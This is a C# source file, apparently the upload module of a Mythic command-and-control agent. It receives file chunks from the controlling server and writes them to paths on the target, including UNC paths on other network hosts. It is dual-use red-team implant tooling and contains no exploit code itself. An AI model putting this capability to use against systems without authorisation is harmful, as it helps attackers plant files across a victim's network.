using Agent.Models.Tasks;
using Agent.Utilities;
using Agent.Models;
using System.Collections.Concurrent;
using System.Diagnostics;
using Agent.Models.Responses;
using Agent.Interfaces;

namespace Agent.Managers
{
    public class UploadManager : IUploadManager
    {
        private ConcurrentDictionary<string, MythicUploadJob> uploadJobs { get; set; }
        IMessageManager messageManager { get; set; }
        ILogger logger { get; set; }
        public UploadManager(IMessageManager messageManager, ILogger logger)
        {
            uploadJobs = new ConcurrentDictionary<string, MythicUploadJob>();
            this.messageManager = messageManager;
            this.logger = logger;
        }
        /// <summary>
        /// Create and start a new upload job
        /// </summary>
        /// <param name="job">The MythicJob to begin</param>
        public async Task StartJob(MythicJob job)
        {
            MythicUploadJob uploadJob = new MythicUploadJob(job);
            Dictionary<string, string> uploadParams = Misc.ConvertJsonStringToDict(job.task.parameters);
            uploadJob.path = uploadParams["remote_path"];
            if (uploadParams.ContainsKey("host") && !string.IsNullOrEmpty(uploadParams["host"]))
            {
                if (!uploadParams["remote_path"].Contains(":") && !uploadParams["remote_path"].StartsWith("\\\\")) //It's not a local path, and it's not already in UNC format
                {
                    uploadJob.path = @"\\" + uploadParams["host"] + @"\" + uploadParams["remote_path"];
                }
            }

            uploadJob.file_id = uploadParams["file"];
            uploadJob.task = job.task;
            uploadJob.chunk_num = 1;

            uploadJobs.GetOrAdd(job.task.id, uploadJob);
            Debug.WriteLine($"[{DateTime.Now}] Starting upload job for file {uploadJob.file_id} ({uploadJob.chunk_num}/{uploadJob.total_chunks})");
            await messageManager.AddResponse( new UploadResponse
            {
                task_id = job.task.id,
                upload = new UploadResponseData
                {
                    chunk_size = uploadJob.chunk_size,
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    full_path = uploadJob.path,
                }
            }.ToJson());
        }
        /// <summary>
        /// Check if an upload job exists and is running
        /// </summary>
        /// <param name="task_id">The MythicJob ID</param>
        public bool ContainsJob(string task_id)
        {
            return uploadJobs.ContainsKey(task_id);
        }
        /// <summary>
        /// Get the UploadJob object by ID
        /// </summary>
        /// <param name="task_id">The MythicJob ID</param>
        public MythicUploadJob GetJob(string task_id)
        {
            return uploadJobs[task_id];
        }
        /// <summary>
        /// Upload the next chunk of the file
        /// </summary>
        /// <param name="bytes">Bytes to writes</param>
        /// <param name="job_id">The MythicJob ID</param>
        public async Task<bool> HandleNextChunk(byte[] bytes, string job_id)
        {
            MythicUploadJob job = uploadJobs[job_id];
            try
            {
                await Misc.AppendAllBytes(job.path, bytes);
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }

        public async Task HandleNextMessage(MythicResponseResult response)
        {
            MythicUploadJob uploadJob = this.GetJob(response.task_id);

            if (uploadJob.cancellationtokensource.IsCancellationRequested)
            {
                //Need to figure out how to track jobs/replace this
                //TaskResponseHandler.activeJobs.Remove(response.task_id, out _);
                this.CompleteUploadJob(response.task_id);
            }

            if (uploadJob.total_chunks == 0)
            {
                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
            }

            if (String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
            {
                await messageManager.AddResponse(new ResponseResult
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x12" } },

                }.ToJson());

                return;
            }

            await this.HandleNextChunk(await Misc.Base64DecodeToByteArrayAsync(response.chunk_data), response.task_id);
            uploadJob.chunk_num++;

            UploadResponse ur = new UploadResponse()
            {
                task_id = response.task_id,
                upload = new UploadResponseData
                {
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    chunk_size = uploadJob.chunk_size,
                    full_path = uploadJob.path
                }
            };
            if (response.chunk_num == uploadJob.total_chunks)
            {
                ur = new UploadResponse()
                {
                    task_id = response.task_id,
                    upload = new UploadResponseData
                    {
                        file_id = uploadJob.file_id,
                        full_path = uploadJob.path,
                    },
                    completed = true
                };
                Debug.WriteLine($"[{DateTime.Now}] Completing job.");
                this.CompleteUploadJob(response.task_id);
                //Need to figure out how to track jobs/replace this
                //TaskResponseHandler.activeJobs.Remove(response.task_id, out _);
            }
            Debug.WriteLine($"[{DateTime.Now}] Requesting next chunk for file {uploadJob.file_id} ({uploadJob.chunk_num}/{uploadJob.total_chunks})");
            await messageManager.AddResponse(ur.ToJson());
        }

        /// <summary>
        /// Complete and remove the upload job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the upload job to complete</param>
        public void CompleteUploadJob(string task_id)
        {
            if (uploadJobs.ContainsKey(task_id))
            {
                uploadJobs.Remove(task_id, out _);
            }
        }
    }
}
